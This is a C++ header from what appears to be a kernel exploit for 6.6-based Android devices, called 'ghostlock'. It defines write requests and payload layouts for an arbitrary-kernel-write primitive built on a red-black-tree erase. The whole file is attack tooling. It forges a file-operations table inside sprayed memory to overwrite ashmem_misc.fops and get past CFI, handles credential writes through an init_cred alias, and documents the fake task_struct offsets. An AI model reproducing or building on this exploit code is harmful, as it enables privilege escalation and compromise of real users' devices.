#ifndef PAYLOAD_BUILDER_H
#define PAYLOAD_BUILDER_H

#include <cstddef>
#include <cstdint>


#include <cstddef>
#include <cstdint>
#include <span>
#include <type_traits>

namespace ghostlock::memory {
    /* Immutable description of one kernel write. `preserve_child` selects the
 * one-child erase layout; false selects the leaf/zero layout. */
    enum class WriteMode : int32_t {
        Disabled = 0,
        Zero = 1,
        Credential = 2,
        /* Write the page-resident value carried by `PayloadWriteLayout::value`
         * (an address inside the payload page) into `target`. Used by the CFI
         * stage: `*(&ashmem_misc.fops) := fake_fops`, where the fake fops table
         * lives inside the sprayed page. Only valid for the non-compact 6.6
         * payload geometry: the CFI stage refuses to run under the compact arm
         * or the tcp layout, where the same three words mean something else. */
        Fops = 3,
        /* Write `WriteRequest::value` verbatim into `target`. The value is
         * forwarded through the erase node's `rb_parent_color`, and the erase
         * arm that stores it is only taken when that word is RED, so bit 0 is
         * forced to 1 and masked off again on the way out (rb_parent() clears
         * it) -- see payload_write_layout(). Used for read-modify-write on a
         * word that must survive the write (vr.ko tags). */
        Value = 4,
    };

    struct WriteRequest final {
        std::uintptr_t target = 0;
        WriteMode mode = WriteMode::Disabled;
        bool preserve_child = false;
        /* The word to store, for WriteMode::Value only; ignored otherwise. */
        std::uintptr_t value = 0;

        [[nodiscard]] static constexpr WriteRequest make(std::uintptr_t target,
                                                         WriteMode mode,
                                                         bool leaf) noexcept {
            return WriteRequest{target, mode, !leaf, 0};
        }

        [[nodiscard]] static constexpr WriteRequest make_value(
            std::uintptr_t target, std::uintptr_t value) noexcept {
            return WriteRequest{target, WriteMode::Value, true, value};
        }
    };

    struct PayloadWriteLayout final {
        std::uintptr_t parent = 0;
        std::uintptr_t right = 0;
        std::uintptr_t left = 0;
        std::uintptr_t fops = 0;
        /* The word stored at `target` for WriteMode::Fops (the fake fops table
         * address); zero for every other mode. */
        std::uintptr_t value = 0;
        /* Payload-page offset of `value`, so the page acceptance check can
         * verify the whole table fits inside the chunk that was sprayed instead
         * of trusting the address arithmetic. Zero for every other mode. */
        std::size_t chunk_offset = 0;
        bool needs_credential_copy = false;
    };

    static_assert(std::is_standard_layout_v<WriteRequest>);
    static_assert(std::is_trivially_copyable_v<WriteRequest>);
    static_assert(offsetof(WriteRequest, target) == 0);
    static_assert(offsetof(WriteRequest, mode) == sizeof(std::uintptr_t));
    static_assert(std::is_standard_layout_v<PayloadWriteLayout>);
    static_assert(std::is_trivially_copyable_v<PayloadWriteLayout>);

    /* Fixed payload fragment sizes shared by the encoders and their callers. */
    inline constexpr std::size_t kCompactWaiterBytes = 0x30;

    /* Bounds-checked encoders. They return false without modifying memory when
 * the destination cannot contain every field required by the layout. */
    [[nodiscard]] bool encode_compact_waiter(
        std::span<std::byte> waiter, const WriteRequest &request,
        const PayloadWriteLayout &layout) noexcept;

    [[nodiscard]] bool encode_multicast_waiter(
        std::span<std::byte> buffer, std::size_t waiter_offset,
        std::size_t task_offset, std::size_t lock_offset, std::uintptr_t fake_task,
        std::uintptr_t fake_lock) noexcept;
} // namespace ghostlock::memory

namespace ghostlock::memory {
    /* Resolve the request-dependent words shared by the three route encoders. */
    PayloadWriteLayout payload_write_layout(
        const WriteRequest *request, uintptr_t page_base,
        uintptr_t default_fops, uintptr_t credential_fops,
        uintptr_t init_cred_alias);

    /* Address of the forged fops table inside one sprayed payload page: the
     * first ORDER3_SIZE chunk, clear of every region the payload writer fills.
     * The binding constraint is the fake `task_struct`: `prepare_skb_payload`
     * writes it from FAKE_TASK_OFF (0x1280) up to `pi_blocked_on`, which is
     * `task_struct` + 2360 = +0x940 on the 6.6 devices this payload targets,
     * i.e. the last byte is 0x1bc7. 0x1d00 clears it by 0x138 bytes and stays
     * 0x2200 below the chunk end, so the whole 0xe0-byte table fits. */
    inline constexpr std::uintptr_t kFakeFopsTableOffset = 0x1d00;

    /* Bytes the forged fops table occupies: show_fdinfo is the last slot any
     * caller can reach, at offset 0xd8, so 0xe0 covers it with 8 bytes spare. */
    inline constexpr std::uintptr_t kFakeFopsTableBytes = 0xe0;

    /* Encode the route-neutral compact waiter write arm. Value writes always use
 * {pc=value,right=0,left=target}; leaf writes use {pc=target-8,0,0}. */
    void build_compact_waiter_payload(
        unsigned char *waiter, const WriteRequest *request,
        const PayloadWriteLayout *layout);

    int32_t payload_write_layout_matches_request(
        const WriteRequest *request, const PayloadWriteLayout *layout);

    int32_t payload_write_layout_accepts_page(
        const WriteRequest *request, const PayloadWriteLayout *layout);

    void build_multicast_waiter_payload(
        unsigned char *buffer, size_t waiter_offset, size_t task_offset,
        size_t lock_offset, uintptr_t fake_task, uintptr_t fake_lock);

    /* Fixed request/layout vectors, including the upstream unified compact arm. */
    int32_t payload_builder_fixed_vector_test(void);
} // namespace ghostlock::memory

#endif
